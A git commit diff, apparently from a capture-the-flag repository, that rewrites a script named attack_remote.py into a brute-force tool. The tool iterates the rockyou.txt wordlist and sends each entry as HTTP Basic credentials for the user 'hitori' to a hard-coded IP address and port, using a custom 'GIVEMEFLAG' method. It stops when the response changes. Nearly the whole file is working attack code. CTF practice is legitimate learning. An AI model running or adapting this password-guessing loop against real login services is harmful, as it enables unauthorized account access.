0605d57a4cb68e8c06db87123f1b7de7e0902357
RobinHsieh <robin0623.hsieh@gmail.com>
2023-12-30 16:47:42 +0000

    updat web 1

--- web/01_Monster/attack_remote.py
+++ web/01_Monster/attack_remote.py
@@ -1,29 +1,37 @@
 import requests
-import json
+from base64 import b64encode
 
 login_url = 'http://140.115.59.7:12002/admin'
-# login_url = 'http://140.115.59.7:12002/admin?username=hitori&password=🤘rockyou!!!'
-# login_url = 'http://140.115.59.7:12002/admin?username=hitori&password=rockyou!!!'
 
-# login_headers = {
-    # 'Content-Type': 'application/json'
-# }
-
-login_data = {
-    "username": "hitori",
-    "password": "🤘rockyou!!!"
+login_headers = {
+    "Host": "140.115.59.7:12002",
+    "Cache-Control": "max-age=0",
+    "Authorization": None,
+    "Upgrade-Insecure-Requests": "1",
+    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+    "Referer": "http://140.115.59.7:12002/",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Accept-Language": "en-US,en;q=0.9,zh-TW;q=0.8,zh;q=0.7,ja;q=0.6,zh-CN;q=0.5,yo;q=0.4",
+    "Connection": "close"
 }
 
-# login_data = json.dumps({
-    # 'username': 'hitori',
-    # 'password': '🤘rockyou!!!'
-# })
 
-# response = requests.request("GIVEMEFLAG", login_url, headers=login_headers, data=login_data)
-response = requests.request("GIVEMEFLAG", login_url, data=login_data)
-# response = requests.request("GIVEMEFLAG", login_url)
-# response = requests.request("POST", login_url)
-# response = requests.request("GET", login_url)
+def set_login(username, password):
+    authorization = b64encode(f"{username}:{password}".encode('utf-8')).decode('ascii')
+    login_headers["Authorization"] = f"Basic {authorization}"
 
-print(response.text)
+count = 0
+with open('rockyou.txt', 'r', encoding='latin-1') as rockyou:
+    for line in rockyou:
+        count += 1
+        line = line.strip()
+        print(f"try {count} password: {line}")
+        set_login("hitori", line)
+        response = requests.request("GIVEMEFLAG", login_url, headers=login_headers)
+    
+        if 'You have not been verified' not in response.text:
+            print(f"found password!: {line}")
+            break
+
 
